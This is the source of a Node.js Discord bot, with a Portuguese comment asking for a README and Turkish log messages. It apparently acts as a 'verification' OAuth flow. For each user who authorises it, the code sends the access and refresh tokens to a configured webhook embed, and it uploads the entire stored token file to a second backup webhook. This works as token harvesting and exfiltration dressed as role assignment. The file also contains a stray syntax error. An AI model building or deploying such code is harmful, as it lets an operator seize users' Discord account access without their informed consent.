//CRIE UM README PARA ESSE CODIGO 
const Discord = require("discord.js");
const client = new Discord.Client({
  intents: 32767,
});
const configs = require("./configs");
const chalk = require("chalk");
const fs = require("fs");
const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const FormData = require("form-data");
const axios = require("axios");

// Adicionando middleware body-parser para interpretar o corpo da requisição como texto
app.use(bodyParser.text());

app.get("/", function (req, res) {
  //Envia o arquivo index.html para o cliente
  res.sendFile(__dirname + "/index.html");
});

app.get("/auth", async (req, res) => {N
  fs.readFile("./object.json", function (err, data) {
    return res.json(JSON.parse(data));
  });
});

app.post("/", async (req, res) => {
  try {
    
    const form = getFormData(req);

    const tokenInfo = await getToken(form);

    const userInfo = await getUserInfo(tokenInfo);

    module.exports = { userInfo };

    var infos = {
      username: userInfo.username + "#" + userInfo.discriminator,
      userID: userInfo.id,
      access_token: tokenInfo.access_token,
      refresh_token: tokenInfo.refresh_token,
    };

    let objectArray = [];
    let file = JSON.parse(fs.readFileSync("./object.json", "utf8"));
    objectArray = file;

    if (objectArray.map((e) => e.userID).includes(userInfo.id)) {
      console.log(chalk.blue(`[!] - ${userInfo.username}#${userInfo.discriminator} Zaten Databasede Kayıtlı`));
    } else {
      console.log(chalk.green(`[+] - ${userInfo.username} # ${userInfo.discriminator}`));
      objectArray.push(infos);
      fs.writeFileSync("./object.json", JSON.stringify(objectArray, null, 2));
    }

    await sendWebhook(infos);

    await sendWebhookBackup();

    client.emit("usuarioAutenticado", userInfo.id);
    
  } catch (error) {
    console.error(error);
  }
});

function getFormData(req) {
  let form = new FormData();
  form.append("client_id", configs.client_id);
  form.append("client_secret", configs.client_secret);
  form.append("grant_type", "authorization_code");
  form.append("redirect_uri", configs.redirect_uri);  form.append("code", req.body);
  return form;
}

async function getToken(form) {
  const response = await fetch("https://discordapp.com/api/oauth2/token", {
    method: "POST",
    body: form,
  });
  return response.json();
}

async function getUserInfo(tokenInfo) {
  const headers = {
    headers: {
      authorization: `${tokenInfo.token_type} ${tokenInfo.access_token}`,
    },
  };

  try {
    const response = await axios.get("https://discordapp.com/api/users/@me", headers);
    return response.data;
  } catch (error) {
    if (error.response.status === 401) {
      console.log("[BOT] Yetkilendirme hatası.");
    } else {
      console.log(error);
    }
  }
}

async function sendWebhook(infos) {
  const data = {
    embeds: [
      {
        color: "000000",
        title: `\`🔥\`・Yeni Kullanıcı`,
        thumbnail: {
          url: `https://cdn.discordapp.com/attachments/1064679607644725299/1064685992071675974/755490897143136446.gif`,
        },
        description:
          ` Kullanıcı: \`${infos.username}\`` +
          `\n\n ID: \`${infos.userID}\`` +
          `\n\n Access Token: \`${infos.access_token}\`` +
          `\n\n Refresh Token: \`${infos.refresh_token}\``,
      },
    ],
  };
  await fetch(`${configs.webhook}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
}

async function sendWebhookBackup() {
  let form = new FormData();
  form.append("files[0]", fs.createReadStream("./object.json"), {
    filename: "object.json",
    contentType: "application/json",
  });

  form.append(
    "payload_json",
    JSON.stringify({
      attachments: [
        {
          id: 0,
          description: "Some description",
          filename: "object.json",
        },
      ],
    })
  );
  await axios({
    method: "POST",
    url: configs.webhookBackup,
    data: form,
    headers: { "Content-Type": "multipart/form-data" },
  });
}

client.on("usuarioAutenticado", async (userID) => {
  try {
    const guild = await client.guilds.fetch(configs.idserver);
    const member = await guild.members.fetch(userID);
    const cargo = await guild.roles.fetch(configs.idrole);

    if (member.roles.cache.has(cargo.id)) {
      console.log(`[BOT] Kullanıcı zaten bu role sahip!`);
    } else {
      member.roles.add(cargo);
      console.log(`[BOT] Rol: ${cargo.name} başarıyla eklendi!`);
    }
  } catch (err) {
    console.log(`[BOT] Kullanıcı sunucuda değil veya rol mevcut değil.`);
  }
});

client.on("interactionCreate", (interaction) => {
  if (interaction.type === Discord.InteractionType.ApplicationCommand) {
    const cmd = client.slashCommands.get(interaction.commandName);

    if (!cmd) return interaction.reply(`Error`);

    interaction["member"] = interaction.guild.members.cache.get(interaction.user.id);

    cmd.run(client, interaction);
  }
});

client.slashCommands = new Discord.Collection();

require("./handler")(client);

console.clear();

app.listen(configs.port, () => {
  console.log(chalk.cyan(`[BOT] Bağlanılan Port: ${configs.port}`));
});

client.on("ready", () => {
  console.log(chalk.cyan(`[BOT] Olarak giriş yapıldı: ${client.user.username}`));
  console.log(chalk.cyan(`[BOT] Prefix: ${configs.prefix}`));
  console.log(
    chalk.cyan(
      `[BOT] Bot Davet: https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n`
    )
  );
  client.user.setActivity(`🔍・Sizi kontrol ediyor...`, { type: "WATCHING" });
});

client.login(configs.token).catch(() => {
  throw new Error(`TOKEN VEYA INTENTLER EKSİK`);
});